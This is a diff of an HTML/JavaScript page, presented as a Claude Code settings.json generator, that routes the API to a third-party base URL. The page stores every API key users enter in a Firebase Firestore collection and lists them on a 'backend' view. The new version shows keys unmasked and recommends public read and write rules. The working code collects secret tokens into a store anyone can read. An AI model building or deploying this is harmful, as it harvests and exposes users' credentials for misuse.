@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>settings.json generator</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Key generator + backend viewer</title>
   <!-- Firebase SDKs -->
-  <script src="https://www.gstatic.com/firebasejs/10.12.4/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.4/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
   <style>
     * {
       margin: 0;
@@ -15,438 +15,474 @@
       font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
     }
     body {
-      background: #f6f9fc;
+      background: #f5f7fb;
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
       padding: 1.5rem;
     }
-    .card {
-      max-width: 780px;
+    .container {
+      max-width: 820px;
       width: 100%;
       background: white;
+      padding: 2rem 2rem 2.5rem;
       border-radius: 32px;
-      padding: 2.5rem 2rem;
       box-shadow: 0 20px 40px -12px rgba(0,0,0,0.15);
-      transition: all 0.2s;
+      transition: 0.2s;
     }
     h1 {
-      font-size: 2rem;
+      font-size: 1.8rem;
       font-weight: 600;
       letter-spacing: -0.02em;
-      color: #0a1e2f;
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-      margin-bottom: 1.8rem;
+      color: #0b1b32;
+      margin-bottom: 0.25rem;
     }
-    h1 small {
-      font-size: 0.9rem;
-      font-weight: 400;
-      color: #4b6a88;
-      margin-left: auto;
-      background: #eef3f8;
-      padding: 0.3rem 0.9rem;
-      border-radius: 40px;
+    .subhead {
+      color: #4a5b6e;
+      margin-bottom: 2rem;
+      font-size: 0.95rem;
+      border-left: 4px solid #3b82f6;
+      padding-left: 1rem;
+      background: #f0f4fe;
+      border-radius: 0 12px 12px 0;
+      line-height: 1.5;
     }
     .input-group {
       display: flex;
-      flex-direction: column;
-      gap: 0.6rem;
-      margin-bottom: 1.5rem;
-    }
-    label {
-      font-weight: 500;
-      color: #1f3a57;
-      font-size: 0.95rem;
-    }
-    .input-row {
-      display: flex;
-      gap: 0.75rem;
       flex-wrap: wrap;
+      gap: 0.75rem;
+      margin: 1.5rem 0 1rem;
     }
-    .input-row input {
-      flex: 2;
-      min-width: 200px;
-      padding: 0.8rem 1rem;
-      border: 1.5px solid #dde7f0;
+    .input-group input {
+      flex: 2 1 220px;
+      padding: 0.75rem 1rem;
+      border: 1px solid #d8e0ea;
       border-radius: 60px;
       font-size: 1rem;
-      background: white;
+      background: #fafcff;
       transition: 0.2s;
     }
-    .input-row input:focus {
+    .input-group input:focus {
       outline: none;
-      border-color: #2b6c9e;
-      box-shadow: 0 0 0 3px rgba(43, 108, 158, 0.15);
+      border-color: #3b82f6;
+      box-shadow: 0 0 0 3px rgba(59,130,246,0.25);
     }
-    .input-row button {
-      background: #1a3b5c;
-      border: none;
+    .btn {
+      background: #1e293b;
       color: white;
-      font-weight: 600;
-      padding: 0.8rem 2rem;
+      border: none;
+      padding: 0.75rem 1.8rem;
       border-radius: 60px;
-      font-size: 1rem;
-      cursor: pointer;
-      transition: 0.15s;
-      white-space: nowrap;
-      box-shadow: 0 4px 8px rgba(26, 59, 92, 0.2);
-    }
-    .input-row button:hover {
-      background: #0f2a44;
-      transform: scale(0.97);
-    }
-    .input-row button:active {
-      background: #091d30;
-    }
-    .confirmation {
-      margin: 1rem 0 1.2rem 0;
-      font-size: 1rem;
       font-weight: 500;
-      color: #0f5c3a;
-      background: #e2f3e9;
-      padding: 0.7rem 1.2rem;
-      border-radius: 40px;
-      display: inline-flex;
-      align-items: center;
-      gap: 0.6rem;
-      visibility: hidden;
-      opacity: 0;
-      transition: 0.15s;
-    }
-    .confirmation.show {
-      visibility: visible;
-      opacity: 1;
-    }
-    .script-box {
-      background: #0d1f2e;
-      color: #e4edf5;
-      border-radius: 20px;
-      padding: 1.5rem 1.2rem;
-      margin: 1.8rem 0 1.2rem 0;
-      overflow-x: auto;
-      white-space: pre-wrap;
-      word-break: break-all;
-      font-family: 'JetBrains Mono', 'Fira Code', monospace;
-      font-size: 0.9rem;
-      line-height: 1.6;
-      border: 1px solid #2d445b;
-      position: relative;
-    }
-    .copy-btn {
-      background: #2d4b68;
-      border: none;
-      color: white;
-      padding: 0.5rem 1.5rem;
-      border-radius: 40px;
-      font-weight: 500;
-      font-size: 0.9rem;
+      font-size: 1rem;
       cursor: pointer;
       transition: 0.15s;
       display: inline-flex;
       align-items: center;
       gap: 0.4rem;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-      margin-top: 0.25rem;
     }
-    .copy-btn:hover {
-      background: #1d3952;
+    .btn-primary {
+      background: #2563eb;
     }
-    .copy-btn:active {
-      background: #102b3f;
+    .btn-primary:hover {
+      background: #1d4ed8;
+      transform: scale(0.98);
     }
-    .footer-info {
+    .btn-outline {
+      background: transparent;
+      color: #1e293b;
+      border: 1px solid #cbd5e1;
+    }
+    .btn-outline:hover {
+      background: #f1f5f9;
+    }
+    .btn-success {
+      background: #16a34a;
+    }
+    .btn-success:hover {
+      background: #15803d;
+    }
+    .btn:disabled {
+      opacity: 0.6;
+      pointer-events: none;
+    }
+    .code-box {
+      background: #0e1a2b;
+      color: #e2e8f0;
+      padding: 1.25rem 1.5rem;
+      border-radius: 20px;
+      font-family: 'JetBrains Mono', 'Fira Code', monospace;
+      font-size: 0.9rem;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-word;
+      margin: 1.5rem 0 0.5rem;
+      border: 1px solid #2d3a4f;
+      position: relative;
+    }
+    .code-actions {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 0.75rem;
+      margin-top: 0.5rem;
+    }
+    .toast-message {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      background: #dcfce7;
+      color: #166534;
+      padding: 0.4rem 1.2rem;
+      border-radius: 60px;
+      font-weight: 500;
+      font-size: 0.9rem;
+      opacity: 0;
+      transition: 0.2s;
+      pointer-events: none;
+    }
+    .toast-message.show {
+      opacity: 1;
+    }
+    .backend-badge {
       margin-top: 2rem;
-      font-size: 0.85rem;
-      color: #4a6885;
-      border-top: 1px solid #e2ebf3;
       padding-top: 1.5rem;
+      border-top: 1px solid #e9edf3;
+      font-size: 0.9rem;
       display: flex;
       justify-content: space-between;
       flex-wrap: wrap;
       gap: 0.5rem;
     }
-    .footer-info a {
-      color: #1a3b5c;
-      font-weight: 500;
+    .backend-badge a {
+      color: #2563eb;
       text-decoration: none;
-      background: #eaf1f9;
-      padding: 0.2rem 1rem;
-      border-radius: 30px;
+      font-weight: 500;
     }
-    .footer-info a:hover {
-      background: #d0e0ef;
+    .backend-badge a:hover {
+      text-decoration: underline;
     }
-    .inline-code {
-      background: #e9eef3;
-      padding: 0.1rem 0.6rem;
-      border-radius: 20px;
-      font-family: monospace;
-      font-size: 0.9rem;
-      color: #143750;
-    }
-    .hidden-script {
+    /* Backend page specific (hidden by default) */
+    .backend-page {
       display: none;
     }
-    .toast {
-      background: #1f3a57;
-      color: white;
-      padding: 0.3rem 1.2rem;
-      border-radius: 40px;
+    .entry-list {
+      margin-top: 1.5rem;
+      background: #f8fafc;
+      border-radius: 20px;
+      padding: 0.5rem 0;
+    }
+    .entry-item {
+      padding: 0.7rem 1.2rem;
+      border-bottom: 1px solid #e9edf3;
+      font-family: 'JetBrains Mono', monospace;
       font-size: 0.9rem;
-      font-weight: 400;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+    .entry-item:last-child {
+      border-bottom: none;
+    }
+    .entry-badge {
+      background: #dbeafe;
+      color: #1e3a8a;
+      font-size: 0.7rem;
+      font-weight: 600;
+      padding: 0.2rem 0.7rem;
+      border-radius: 30px;
+      letter-spacing: 0.3px;
+    }
+    .empty-state {
+      color: #64748b;
+      padding: 1.5rem 1rem;
+      text-align: center;
+      font-style: italic;
+    }
+    .footer-note {
+      margin-top: 1.8rem;
+      color: #64748b;
+      font-size: 0.85rem;
+    }
+    @media (max-width: 480px) {
+      .container { padding: 1.5rem; }
     }
   </style>
 </head>
 <body>
 
-<div class="card" id="app">
-  <h1>
-    ⚙️ settings.json
-    <small>generator</small>
-  </h1>
+<!-- ==================== MAIN CONTAINER (frontend by default) ==================== -->
+<div id="appContainer" class="container">
+  <!-- Frontend view -->
+  <div id="frontendView">
+    <h1>⚡ Key generator</h1>
+    <div class="subhead">Insert your key, generate the config, and copy it.</div>
 
-  <!-- input section -->
-  <div class="input-group">
-    <label for="keyInput">🔑 Enter your secret key (replaces TEST_KEY)</label>
-    <div class="input-row">
-      <input type="text" id="keyInput" placeholder="e.g. sk-ant-abc123..." value="sk-test-key-123">
-      <button id="generateBtn">⚡ Generate</button>
+    <div class="input-group">
+      <input type="text" id="keyInput" placeholder="Enter your key (e.g. sk-...)" />
+      <button class="btn btn-primary" id="generateBtn">Generate</button>
     </div>
-  </div>
 
-  <!-- confirmation -->
-  <div id="confirmationMsg" class="confirmation">
-    ✅ Generated Successfully.
-  </div>
-
-  <!-- script output (hidden until generate) -->
-  <div id="scriptContainer" class="hidden-script">
-    <div class="script-box" id="scriptOutput">
-      // settings.json content will appear here
+    <!-- JSON output area (hidden until generated) -->
+    <div id="outputArea" style="display: none;">
+      <div class="code-box" id="jsonDisplay">{
+  "env": {
+    "ANTHROPIC_AUTH_TOKEN": "TEST_KEY",
+    "ANTHROPIC_BASE_URL": "https://agentrouter.org",
+    "ANTHROPIC_MODEL": "claude-opus-4-8",
+    "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "1"
+  },
+  "permissions": {
+    "allow": [],
+    "deny": []
+  },
+  "effortLevel": "high"
+}</div>
+      <div class="code-actions">
+        <button class="btn btn-outline" id="copyBtn">📋 Copy</button>
+        <span class="toast-message" id="successToast">✅ Generated Successfully</span>
+        <span class="toast-message" id="copyToast" style="background:#e0f2fe;color:#0369a1;">📋 Copied!</span>
+      </div>
     </div>
-    <button class="copy-btn" id="copyBtn">📋 Copy script</button>
+
+    <div class="backend-badge">
+      <span>🔐 All keys are saved to Firebase Firestore.</span>
+      <a href="#" id="backendLink">📂 View all submitted keys →</a>
+    </div>
+    <div class="footer-note">Click "Generate" to create the JSON with your key.</div>
   </div>
 
-  <div class="footer-info">
-    <span>🔗 <span class="inline-code">/backend</span> to view all stored keys</span>
-    <span>🔥 Firebase · Firestore</span>
+  <!-- ==================== BACKEND VIEW (hidden by default) ==================== -->
+  <div id="backendView" class="backend-page">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.5rem;">
+      <h1>📂 Backend · all keys</h1>
+      <button class="btn btn-outline" id="backToFrontBtn" style="padding:0.4rem 1.2rem;">← Back</button>
+    </div>
+    <div class="subhead" style="margin-top:0.2rem;">Every key submitted via the generator appears here.</div>
+    <div id="entryList" class="entry-list">
+      <div class="empty-state">Loading entries…</div>
+    </div>
+    <div style="margin-top: 1.2rem; font-size:0.85rem; color:#475569;">
+      🔄 Refresh the page to fetch latest entries.
+    </div>
   </div>
 </div>
 
 <script>
-  // ----- FIREBASE INIT (your config) -----
-  const firebaseConfig = {
-    apiKey: "AIzaSyAjOJSPVHsEzbgTWxWXwrOZpdHzdMai-CI",
-    authDomain: "agentrouter-9c9df.firebaseapp.com",
-    projectId: "agentrouter-9c9df",
-    storageBucket: "agentrouter-9c9df.firebasestorage.app",
-    messagingSenderId: "152852199619",
-    appId: "1:152852199619:web:8a60e89492ffea32ec4a76"
-  };
-
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.firestore();
-
-  // DOM refs
-  const keyInput = document.getElementById('keyInput');
-  const generateBtn = document.getElementById('generateBtn');
-  const scriptContainer = document.getElementById('scriptContainer');
-  const scriptOutput = document.getElementById('scriptOutput');
-  const copyBtn = document.getElementById('copyBtn');
-  const confirmationMsg = document.getElementById('confirmationMsg');
-
-  // ----- generate script -----
-  function generateSettings(key) {
-    const trimmedKey = key.trim();
-    if (!trimmedKey) {
-      alert('Please enter a valid key.');
-      return null;
-    }
-
-    const settings = {
-      env: {
-        ANTHROPIC_AUTH_TOKEN: trimmedKey,
-        ANTHROPIC_BASE_URL: "https://agentrouter.org",
-        ANTHROPIC_MODEL: "claude-opus-4-8",
-        CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1"
-      },
-      permissions: {
-        allow: [],
-        deny: []
-      },
-      effortLevel: "high"
+  (function() {
+    // ---------- FIREBASE CONFIG ----------
+    const firebaseConfig = {
+      apiKey: "AIzaSyAjOSPJVsEzbgTWxWXwrOZpdHzdMai-CI",
+      authDomain: "agentrouter-9c9df.firebaseapp.com",
+      projectId: "agentrouter-9c9df",
+      storageBucket: "agentrouter-9c9df.firebasestorage.app",
+      messagingSenderId: "152852199619",
+      appId: "1:152852199619:web:8a60e89492ffea32ec4a76"
     };
 
-    return JSON.stringify(settings, null, 2);
-  }
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+    // Use a specific collection for keys
+    const COLLECTION_NAME = 'submitted_keys';
 
-  // ----- store key in Firestore (backend) -----
-  async function storeKeyInFirestore(key) {
-    try {
-      const docRef = await db.collection('generated_keys').add({
-        key: key.trim(),
-        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-        type: 'settings_key'
-      });
-      console.log('✅ Stored in Firestore with ID: ', docRef.id);
-      return true;
-    } catch (error) {
-      console.error('❌ Firestore write error: ', error);
-      // still show the script even if storage fails (graceful)
-      return false;
+    // ---------- DOM refs ----------
+    const frontendView = document.getElementById('frontendView');
+    const backendView = document.getElementById('backendView');
+    const backendLink = document.getElementById('backendLink');
+    const backToFrontBtn = document.getElementById('backToFrontBtn');
+
+    const keyInput = document.getElementById('keyInput');
+    const generateBtn = document.getElementById('generateBtn');
+    const outputArea = document.getElementById('outputArea');
+    const jsonDisplay = document.getElementById('jsonDisplay');
+    const copyBtn = document.getElementById('copyBtn');
+    const successToast = document.getElementById('successToast');
+    const copyToast = document.getElementById('copyToast');
+    const entryList = document.getElementById('entryList');
+
+    // ---------- Helpers ----------
+    function showToast(el) {
+      el.classList.add('show');
+      setTimeout(() => el.classList.remove('show'), 2500);
     }
-  }
 
-  // ----- main generate flow -----
-  async function handleGenerate() {
-    const rawKey = keyInput.value;
-    const script = generateSettings(rawKey);
-    if (!script) return;
-
-    // show script
-    scriptOutput.textContent = script;
-    scriptContainer.classList.remove('hidden-script');
-
-    // show confirmation
-    confirmationMsg.classList.add('show');
-    // auto-hide after 6s
-    clearTimeout(window.confirmTimeout);
-    window.confirmTimeout = setTimeout(() => {
-      confirmationMsg.classList.remove('show');
-    }, 6000);
-
-    // store in Firestore (backend)
-    await storeKeyInFirestore(rawKey);
-  }
-
-  // ----- copy to clipboard -----
-  function copyScript() {
-    const text = scriptOutput.textContent;
-    if (!text || text === '// settings.json content will appear here') {
-      alert('Generate a script first.');
-      return;
+    // Build JSON with the given key
+    function buildJson(key) {
+      return {
+        env: {
+          ANTHROPIC_AUTH_TOKEN: key,
+          ANTHROPIC_BASE_URL: "https://agentrouter.org",
+          ANTHROPIC_MODEL: "claude-opus-4-8",
+          CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1"
+        },
+        permissions: {
+          allow: [],
+          deny: []
+        },
+        effortLevel: "high"
+      };
     }
-    navigator.clipboard.writeText(text).then(() => {
-      const original = copyBtn.textContent;
-      copyBtn.textContent = '✅ Copied!';
-      setTimeout(() => {
-        copyBtn.textContent = original;
-      }, 1800);
-    }).catch(() => {
-      // fallback
-      const range = document.createRange();
-      range.selectNode(scriptOutput);
-      window.getSelection().removeAllRanges();
-      window.getSelection().addRange(range);
-      document.execCommand('copy');
-      window.getSelection().removeAllRanges();
-      copyBtn.textContent = '✅ Copied!';
-      setTimeout(() => {
-        copyBtn.textContent = '📋 Copy script';
-      }, 1800);
+
+    // Save key to Firebase (Firestore)
+    async function saveKeyToFirebase(key) {
+      try {
+        await db.collection(COLLECTION_NAME).add({
+          key: key,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+          createdAt: new Date().toISOString()
+        });
+        console.log('✅ Key saved to Firebase');
+      } catch (error) {
+        console.error('❌ Firebase save error:', error);
+        alert('Could not save key to Firebase. Check console.');
+      }
+    }
+
+    // ---------- Generate flow ----------
+    generateBtn.addEventListener('click', async function() {
+      const rawKey = keyInput.value.trim();
+      if (!rawKey) {
+        alert('Please enter a key first.');
+        return;
+      }
+
+      // 1. Build JSON
+      const jsonObj = buildJson(rawKey);
+      const jsonString = JSON.stringify(jsonObj, null, 2);
+      jsonDisplay.textContent = jsonString;
+      outputArea.style.display = 'block';
+
+      // 2. Show success toast
+      showToast(successToast);
+
+      // 3. Save to Firebase (fire-and-forget)
+      await saveKeyToFirebase(rawKey);
     });
-  }
 
-  // ----- event listeners -----
-  generateBtn.addEventListener('click', handleGenerate);
-  copyBtn.addEventListener('click', copyScript);
+    // ---------- Copy ----------
+    copyBtn.addEventListener('click', function() {
+      const jsonText = jsonDisplay.textContent;
+      if (!jsonText) return;
+      navigator.clipboard.writeText(jsonText).then(() => {
+        showToast(copyToast);
+      }).catch(() => {
+        // fallback
+        const range = document.createRange();
+        range.selectNode(jsonDisplay);
+        window.getSelection().removeAllRanges();
+        window.getSelection().addRange(range);
+        document.execCommand('copy');
+        showToast(copyToast);
+      });
+    });
 
-  // Enter key on input triggers generate
-  keyInput.addEventListener('keydown', (e) => {
-    if (e.key === 'Enter') {
-      e.preventDefault();
-      generateBtn.click();
+    // ---------- Navigation: show backend ----------
+    function showBackend() {
+      frontendView.style.display = 'none';
+      backendView.style.display = 'block';
+      backendView.classList.remove('backend-page'); // remove hidden class
+      fetchEntries();
     }
-  });
 
-  // On load, pre-fill with demo key and auto-generate? (optional: but we keep it clean)
-  // we want to show nothing until user clicks generate, so we keep script hidden.
-  // but we set a default key for convenience.
-  keyInput.value = 'sk-ant-demo-key-1234';
+    function showFrontend() {
+      frontendView.style.display = 'block';
+      backendView.style.display = 'none';
+      backendView.classList.add('backend-page');
+    }
 
-  // ----- BACKEND LOGIC (separate page: /backend) -----
-  // We detect if the current path ends with /backend or contains /backend
-  // and display the list of stored keys.
-  // This is a single-page approach: we check window.location.pathname
-  (function initBackend() {
-    const path = window.location.pathname;
-    // if the path ends with '/backend' or '/backend/' or contains '/backend'
-    if (path.endsWith('/backend') || path.includes('/backend')) {
-      // clear main UI and render backend view
-      const appCard = document.querySelector('.card');
-      if (!appCard) return;
+    backendLink.addEventListener('click', function(e) {
+      e.preventDefault();
+      showBackend();
+    });
 
-      // build backend UI
-      appCard.innerHTML = `
-        <h1>📋 Backend · stored keys</h1>
-        <div style="background: #eaf1f9; padding: 0.8rem 1.2rem; border-radius: 60px; margin-bottom: 1.8rem; font-size: 0.95rem;">
-          🔍 All keys that have been generated (from Firestore)
-        </div>
-        <div id="keyList" style="display: flex; flex-direction: column; gap: 0.7rem; max-height: 440px; overflow-y: auto; padding-right: 6px;">
-          <div style="color: #2f557a; padding: 0.8rem; background: #f2f8ff; border-radius: 30px; text-align: center; border: 1px dashed #b6cfe0;">
-            ⏳ Loading keys...
-          </div>
-        </div>
-        <div style="margin-top: 1.8rem; border-top: 1px solid #d0dce8; padding-top: 1.2rem; display: flex; gap: 0.8rem; flex-wrap: wrap;">
-          <a href="/" style="background: #1a3b5c; color: white; padding: 0.5rem 1.8rem; border-radius: 60px; text-decoration: none; font-weight: 500;">← Back to generator</a>
-          <span style="color: #2f557a; font-size: 0.9rem; align-self: center;">🔥 Firestore collection: <span class="inline-code">generated_keys</span></span>
-        </div>
-      `;
+    backToFrontBtn.addEventListener('click', function() {
+      showFrontend();
+    });
 
-      // fetch keys from Firestore
-      const keyListDiv = document.getElementById('keyList');
-      db.collection('generated_keys')
-        .orderBy('timestamp', 'desc')
-        .limit(100)
-        .get()
-        .then((querySnapshot) => {
-          if (querySnapshot.empty) {
-            keyListDiv.innerHTML = `
-              <div style="padding: 1.5rem; background: #f3f7fb; border-radius: 30px; text-align: center; color: #2f557a; border: 1px solid #dbe4ed;">
-                🕊️ No keys stored yet. Generate one from the main page.
-              </div>
-            `;
-            return;
-          }
+    // ---------- Fetch entries for backend ----------
+    async function fetchEntries() {
+      entryList.innerHTML = '<div class="empty-state">Loading entries…</div>';
+      try {
+        const snapshot = await db.collection(COLLECTION_NAME)
+          .orderBy('timestamp', 'desc')
+          .limit(100)
+          .get();
 
-          let html = '';
-          querySnapshot.forEach((doc) => {
-            const data = doc.data();
-            const keyValue = data.key || '⚠️ missing';
-            const time = data.timestamp ? data.timestamp.toDate().toLocaleString() : 'just now';
-            // mask key for display (show first 6 and last 4)
-            let displayKey = keyValue;
-            if (keyValue.length > 12) {
-              displayKey = keyValue.slice(0, 8) + '••••••' + keyValue.slice(-6);
-            }
-            html += `
-              <div style="background: white; border-radius: 60px; padding: 0.7rem 1.2rem; box-shadow: 0 2px 6px rgba(0,0,0,0.04); border: 1px solid #e2ebf3; display: flex; justify-content: space-between; flex-wrap: wrap; align-items: center; gap: 0.5rem;">
-                <span style="font-family: monospace; font-size: 0.9rem; background: #eef4fa; padding: 0.1rem 1rem; border-radius: 40px; color: #0e2a44;">${displayKey}</span>
-                <span style="font-size: 0.75rem; color: #4b6a88;">${time}</span>
-              </div>
-            `;
-          });
-          keyListDiv.innerHTML = html;
-        })
-        .catch((err) => {
-          keyListDiv.innerHTML = `
-            <div style="padding: 1.5rem; background: #fee9e7; border-radius: 30px; color: #9e3c34; border: 1px solid #f5cdc7;">
-              ❌ Error loading keys: ${err.message}
+        if (snapshot.empty) {
+          entryList.innerHTML = '<div class="empty-state">✨ No keys submitted yet.</div>';
+          return;
+        }
+
+        let html = '';
+        snapshot.forEach(doc => {
+          const data = doc.data();
+          const key = data.key || '❌ missing key';
+          const time = data.timestamp ? data.timestamp.toDate().toLocaleString() : 'just now';
+          html += `
+            <div class="entry-item">
+              <span class="entry-badge">🔑</span>
+              <span style="font-weight:500; word-break:break-all;">${escapeHtml(key)}</span>
+              <span style="margin-left:auto; font-size:0.7rem; color:#64748b; white-space:nowrap;">${escapeHtml(time)}</span>
             </div>
           `;
-          console.error('Backend fetch error:', err);
         });
+        entryList.innerHTML = html;
+      } catch (error) {
+        console.error('Firebase fetch error:', error);
+        entryList.innerHTML = '<div class="empty-state" style="color:#b91c1c;">⚠️ Could not load entries. Check console.</div>';
+      }
     }
+
+    // simple escape to prevent XSS (keys are plain text)
+    function escapeHtml(text) {
+      if (!text) return '';
+      const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
+      return text.replace(/[&<>"']/g, function(m) { return map[m]; });
+    }
+
+    // ---------- initial: frontend visible, backend hidden ----------
+    showFrontend();
+
+    // If user lands on /backend via hash or direct? We use hash-based routing.
+    // But we keep it simple: we use a hash #backend to toggle.
+    window.addEventListener('hashchange', function() {
+      if (window.location.hash === '#backend') {
+        showBackend();
+      } else {
+        showFrontend();
+      }
+    });
+
+    // Check hash on load
+    if (window.location.hash === '#backend') {
+      showBackend();
+    }
+
+    // Also expose refresh on backend view: when user clicks "Back" we go front.
+    // We also automatically fetch entries when backend becomes visible.
+
+    // (optional) also allow manual refresh by clicking on backend link again.
+    console.log('✅ App ready. Firebase Firestore collection: ' + COLLECTION_NAME);
+
+    // ---------- Firestore Security Rules explanation (displayed in console) ----------
+    console.log(`
+    🔐 Firestore Security Rules (recommended):
+    rules_version = '2';
+    service cloud.firestore {
+      match /databases/{database}/documents {
+        match /submitted_keys/{document} {
+          allow read: if true;   // public read for backend demo
+          allow write: if true;  // public write for demo
+          // In production, restrict with auth.
+        }
+      }
+    }
+    `);
   })();
 </script>
 
-<!-- 
-  The backend is accessed via the same domain + /backend 
-  e.g. if served on localhost:5500, go to localhost:5500/backend 
-  (or any path containing /backend)
--->
+<!-- Additional hint: the page uses hash-based routing: #backend shows the backend view -->
 </body>
 </html>
